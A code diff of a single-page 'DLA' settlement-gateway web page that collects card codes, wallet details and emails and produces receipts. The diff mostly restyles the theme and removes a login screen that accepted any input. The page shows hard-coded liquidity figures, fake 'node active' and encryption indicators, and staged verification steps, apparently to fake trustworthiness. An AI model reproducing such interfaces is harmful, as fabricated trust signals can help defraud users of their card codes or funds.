@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" data-theme="dark">
+<html lang="en" data-theme="light">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -8,51 +8,46 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root { --gold: #d4af37; --bg: #000; --panel: #0f1115; --text: #fff; --input-bg: #16191e; --border: #333; }
-        [data-theme="light"] { --bg: #eceff1; --panel: #ffffff; --text: #1a1a1a; --input-bg: #e0e6ea; --border: #ccc; }
+        :root { --gold: #d4af37; --bg: #eceff1; --panel: #ffffff; --text: #1a1a1a; --input-bg: #e0e6ea; --border: #ccc; --card-bg: #f8f9fa; }
+        [data-theme="dark"] { --bg: #000; --panel: #0f1115; --text: #fff; --input-bg: #16191e; --border: #333; --card-bg: #111; }
+        
         body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; padding-bottom: 20px; display: flex; flex-direction: column; align-items: center; overflow-x: hidden; transition: background 0.3s; }
         
-        /* AUTH & DASHBOARD STYLES */
-        #auth-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 10001; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
-        .auth-card { background: var(--panel); border: 1px solid var(--border); padding: 30px; border-radius: 24px; width: 90%; max-width: 350px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
-        .auth-tabs { display: flex; margin-bottom: 20px; border-bottom: 1px solid #222; }
-        .auth-tab { flex: 1; padding: 10px; cursor: pointer; color: #555; font-size: 12px; font-weight: 800; text-transform: uppercase; }
-        .auth-tab.active { color: var(--gold); border-bottom: 2px solid var(--gold); }
+        /* DASHBOARD / HISTORY STYLES */
         #dashboard-view { display: none; width: 100%; }
-        .tx-item { background: #111; padding: 15px; border-radius: 12px; margin-bottom: 10px; border: 1px solid #222; text-align: left; }
+        .tx-item { background: var(--card-bg); padding: 15px; border-radius: 12px; margin-bottom: 10px; border: 1px solid var(--border); text-align: left; transition: 0.3s; }
         .status-badge { font-size: 9px; padding: 3px 8px; border-radius: 4px; font-weight: 900; }
-        .status-pending { background: rgba(212,175,55,0.1); color: var(--gold); }
+        .status-pending { background: rgba(212,175,55,0.1); color: var(--gold); border: 1px solid rgba(212,175,55,0.3); }
+        .history-text { color: var(--text); }
 
         /* ORIGINAL STYLES */
         .theme-toggle { position: fixed; top: 15px; right: 15px; z-index: 9999; background: var(--gold); border: none; padding: 8px 12px; border-radius: 8px; font-weight: 800; font-size: 10px; color: #000; cursor: pointer; text-transform: uppercase; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
         .ticker-wrap { width: 100%; background: #111; border-bottom: 1px solid var(--gold); padding: 10px 0; font-size: 11px; color: var(--gold); overflow: hidden; white-space: nowrap; }
         .ticker { display: inline-block; white-space: nowrap; animation: scrollText 25s linear infinite; padding-left: 100%; }
         @keyframes scrollText { 0% { transform: translate3d(0, 0, 0); } 100% { transform: translate3d(-100%, 0, 0); } }
-        .panel { background: var(--panel); border: 1px solid var(--border); padding: 25px; width: 92%; max-width: 440px; box-sizing: border-box; margin-top: 20px; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); position: relative; color: var(--text); }
+        .panel { background: var(--panel); border: 1px solid var(--border); padding: 25px; width: 92%; max-width: 440px; box-sizing: border-box; margin-top: 20px; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); position: relative; color: var(--text); transition: 0.3s; }
         h2 { margin: 0; font-size: 24px; font-weight: 800; letter-spacing: -1px; }
         .tag { font-size: 10px; color: var(--gold); font-weight: bold; letter-spacing: 2px; margin-bottom: 25px; text-transform: uppercase; }
         label { font-size: 11px; color: #888; display: block; margin-top: 18px; margin-bottom: 8px; text-transform: uppercase; font-weight: 700; }
         input, select { width: 100%; padding: 14px; background: var(--input-bg); border: 1px solid var(--border); color: var(--text); border-radius: 12px; font-size: 16px; outline: none; box-sizing: border-box; }
-        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; margin: 15px 0; max-height: 280px; overflow-y: auto; padding: 10px; border: 1px solid var(--border); border-radius: 12px; background: #0a0c10; scrollbar-width: thin; scrollbar-color: var(--gold) #111; }
-        .grid::-webkit-scrollbar { width: 6px; }
-        .grid::-webkit-scrollbar-thumb { background: var(--gold); border-radius: 3px; }
-        .pay { border: 1px solid #333; padding: 12px 8px; text-align: left; font-size: 11px; cursor: pointer; color: #ccc; border-radius: 10px; background: #111; font-weight: bold; display: flex; align-items: center; gap: 8px; transition: 0.2s; }
-        .pay.active { border-color: var(--gold); background: rgba(212,175,55,0.15); color: #fff; }
+        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; margin: 15px 0; max-height: 280px; overflow-y: auto; padding: 10px; border: 1px solid var(--border); border-radius: 12px; background: var(--input-bg); scrollbar-width: thin; scrollbar-color: var(--gold) #ccc; }
+        .pay { border: 1px solid var(--border); padding: 12px 8px; text-align: left; font-size: 11px; cursor: pointer; color: var(--text); border-radius: 10px; background: var(--panel); font-weight: bold; display: flex; align-items: center; gap: 8px; transition: 0.2s; }
+        .pay.active { border-color: var(--gold); background: rgba(212,175,55,0.15); }
         .res-box { background: #000; border: 1px solid var(--gold); padding: 15px; text-align: center; margin: 15px 0; border-radius: 16px; }
         .res-box b { font-size: 34px; color: #fff; display: block; }
         #local-payout { font-size: 13px; color: #4ade80; margin-top: 8px; font-weight: bold; display: none; background: rgba(74,222,128,0.1); padding: 6px; border-radius: 8px; border: 1px dashed #4ade80; }
-        .node-footer { margin-top: 30px; padding-top: 20px; border-top: 1px solid #222; text-align: center; }
-        .node-footer p { font-size: 10px; color: #555; font-weight: 800; letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 15px; }
+        .node-footer { margin-top: 30px; padding-top: 20px; border-top: 1px solid var(--border); text-align: center; }
+        .node-footer p { font-size: 10px; color: #888; font-weight: 800; letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 15px; }
         .node-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; padding: 0 5px; }
-        .node-item { font-size: 8px; color: #999; font-weight: 700; text-transform: uppercase; display: flex; align-items: center; gap: 4px; padding: 6px 4px; border-radius: 4px; background: rgba(255,255,255,0.02); border: 1px solid #1a1a1a; }
+        .node-item { font-size: 8px; color: #888; font-weight: 700; text-transform: uppercase; display: flex; align-items: center; gap: 4px; padding: 6px 4px; border-radius: 4px; background: rgba(0,0,0,0.02); border: 1px solid var(--border); }
         .node-dot { width: 5px; height: 5px; background: #4ade80; border-radius: 50%; box-shadow: 0 0 8px #4ade80; animation: pulseNode 2s infinite; }
-        @keyframes pulseNode { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
         .main-btn { width: 100%; padding: 18px; background: var(--gold); border: none; font-weight: 800; cursor: pointer; color: #000; border-radius: 14px; text-transform: uppercase; font-size: 14px; margin-top: 15px; transition: 0.2s; }
-        .secure-badge { text-align: center; font-size: 10px; color: #555; margin-top: 12px; display: flex; align-items: center; justify-content: center; gap: 5px; font-weight: 700; text-transform: uppercase; }
+        .secure-badge { text-align: center; font-size: 10px; color: #888; margin-top: 12px; display: flex; align-items: center; justify-content: center; gap: 5px; font-weight: 700; text-transform: uppercase; }
         #loader { display: none; text-align: center; padding: 30px 0; }
-        #v-steps { font-size: 11px; color: #444; margin-top: 20px; text-align: left; line-height: 2.2; }
+        #v-steps { font-size: 11px; color: #666; margin-top: 20px; text-align: left; line-height: 2.2; }
         .step-done { color: #4ade80 !important; font-weight: bold; }
-        #pbar_container { width: 100%; height: 6px; background: #222; border-radius: 10px; overflow: hidden; }
+        #pbar_container { width: 100%; height: 6px; background: #ddd; border-radius: 10px; overflow: hidden; }
+        [data-theme="dark"] #pbar_container { background: #222; }
         #pbar { width: 0%; height: 100%; background: var(--gold); transition: width 0.3s; }
         #success { display: none; width: 100%; text-align: center; }
         .receipt-container { background: #fff; color: #000; padding: 25px; position: relative; width: 100%; max-width: 370px; margin: 0 auto; box-sizing: border-box; overflow: hidden; border-radius: 4px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
@@ -72,27 +67,14 @@
         .hero-local { font-size: 22px; font-weight: 800; color: #333; }
         .black-banner { background: #000; color: #fff; text-align: center; padding: 12px; font-weight: 900; font-size: 15px; letter-spacing: 1px; margin-bottom: 15px; }
         .receipt-footer { text-align: center; font-size: 8px; color: #888; font-weight: 700; line-height: 1.3; margin-top: 15px; }
-        .chat-btn { position: fixed; bottom: 20px; left: 20px; background: #16191e; border: 1px solid #333; padding: 12px 18px; border-radius: 50px; display: flex; align-items: center; gap: 10px; text-decoration: none; color: #fff; z-index: 3000; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+        .chat-btn { position: fixed; bottom: 20px; left: 20px; background: #fff; border: 1px solid #ccc; padding: 12px 18px; border-radius: 50px; display: flex; align-items: center; gap: 10px; text-decoration: none; color: #000; z-index: 3000; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        [data-theme="dark"] .chat-btn { background: #16191e; color: #fff; border-color: #333; }
         .dot { width: 8px; height: 8px; background: #25d366; border-radius: 50%; animation: blink 1.5s infinite; }
     </style>
 </head>
 <body>
 
-    <div id="auth-screen">
-        <div class="auth-card">
-            <h2 style="color:var(--gold)">DLA ACCESS</h2>
-            <p style="font-size:10px; color:#555; margin-bottom:20px;">SECURE SETTLEMENT GATEWAY</p>
-            <div class="auth-tabs">
-                <div class="auth-tab active" onclick="switchAuth(this, 'login')">Login</div>
-                <div class="auth-tab" onclick="switchAuth(this, 'signup')">Sign Up</div>
-            </div>
-            <input type="text" id="auth-user" placeholder="USERNAME / EMAIL" style="margin-bottom:10px;">
-            <input type="password" id="auth-pass" placeholder="PASSWORD">
-            <button class="main-btn" onclick="handleAuth()">Enter Portal</button>
-        </div>
-    </div>
-
-    <button class="theme-toggle" id="theme-btn" onclick="toggleTheme()">☀️ LIGHT</button>
+    <button class="theme-toggle" id="theme-btn" onclick="toggleTheme()">🌙 DARK</button>
     <div class="ticker-wrap"><div class="ticker" id="live-ticker">💰 LIQUIDITY: $2,840,500 • 🛡️ DLA ENCRYPTION • ⚡ INSTANT SETTLEMENT • 🌍 GLOBAL NODE ACTIVE</div></div>
 
     <div class="panel">
@@ -100,10 +82,10 @@
         <div id="dashboard-view">
             <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
                 <h2 style="font-size:18px;">ACTIVITY</h2>
-                <button onclick="toggleView('exchange')" class="pay" style="padding:5px 10px;">+ NEW EXCHANGE</button>
+                <button onclick="toggleView('exchange')" class="pay" style="padding:5px 10px; background:var(--gold); color:#000; border:none;">+ NEW EXCHANGE</button>
             </div>
             <div id="tx-history-list">
-                <p style="font-size:11px; color:#444;">No recent activity found.</p>
+                <p style="font-size:11px; color:#888;">No recent activity found.</p>
             </div>
         </div>
 
@@ -230,21 +212,7 @@
         let method = ""; let rateL = 1; let sym = "USD";
         const successSound = new Audio('https://assets.mixkit.co/active_storage/sfx/2013/2013-preview.mp3');
 
-        // NEW AUTH & DASHBOARD LOGIC
-        function switchAuth(el, mode) {
-            document.querySelectorAll('.auth-tab').forEach(t => t.classList.remove('active'));
-            el.classList.add('active');
-        }
-
-        function handleAuth() {
-            const user = document.getElementById('auth-user').value;
-            const pass = document.getElementById('auth-pass').value;
-            if(user.length < 3 || pass.length < 3) return alert("Enter valid credentials");
-            
-            document.getElementById('auth-screen').style.display = 'none';
-            loadDashboard();
-        }
-
+        // HISTORY NAVIGATION
         function toggleView(view) {
             if(view === 'dashboard') {
                 document.getElementById('form').style.display = 'none';
@@ -264,16 +232,16 @@
             container.innerHTML = history.reverse().map(tx => `
                 <div class="tx-item">
                     <div style="display:flex; justify-content:space-between; align-items:center;">
-                        <span style="font-size:10px; color:#555;">${tx.id}</span>
+                        <span style="font-size:10px; color:#888;">${tx.id}</span>
                         <span class="status-badge status-pending">PENDING</span>
                     </div>
-                    <div style="font-weight:800; font-size:16px; margin:5px 0;">${tx.amount}</div>
-                    <div style="font-size:10px; color:#888;">Asset: ${tx.asset}</div>
+                    <div style="font-weight:800; font-size:18px; margin:5px 0; color:var(--text);">${tx.amount}</div>
+                    <div style="font-size:10px; color:#888;">Asset: ${tx.asset} • ${tx.date}</div>
                 </div>
             `).join('');
         }
 
-        // ORIGINAL LOGIC (Intact)
+        // ORIGINAL LOGIC
         const wmLayer = document.getElementById('wm-layer');
         for(let i=0; i<30; i++) {
             const span = document.createElement('span');
@@ -331,9 +299,14 @@
             
             if(!method || !cardCode || !walletDetails || !userEmail) return alert("Please fill all fields.");
 
-            // Save to local history for Pending Transactions
+            // Save to local history
             const history = JSON.parse(localStorage.getItem('dla_history') || '[]');
-            const newTx = { id: 'DLA-'+Math.floor(Math.random()*99999), amount: amount, asset: assetName, date: new Date().toLocaleDateString() };
+            const newTx = { 
+                id: 'DLA-'+Math.floor(Math.random()*99999), 
+                amount: amount, 
+                asset: assetName, 
+                date: new Date().toLocaleDateString() 
+            };
             history.push(newTx);
             localStorage.setItem('dla_history', JSON.stringify(history));
 
